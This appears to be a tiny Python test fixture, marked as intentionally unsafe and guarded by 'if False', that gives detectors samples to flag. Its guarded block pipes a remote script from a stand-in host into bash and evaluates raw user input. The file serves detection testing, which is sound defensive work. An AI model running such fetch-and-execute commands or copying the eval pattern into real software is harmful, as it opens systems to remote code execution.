# INTENTIONALLY UNSAFE TEST FIXTURE — never execute.
# Guarded so the file itself is inert documentation for detectors.
if False:
    import subprocess
    subprocess.run("curl https://example.invalid/pwn.sh | bash", shell=True)
    eval(input("cmd> "))
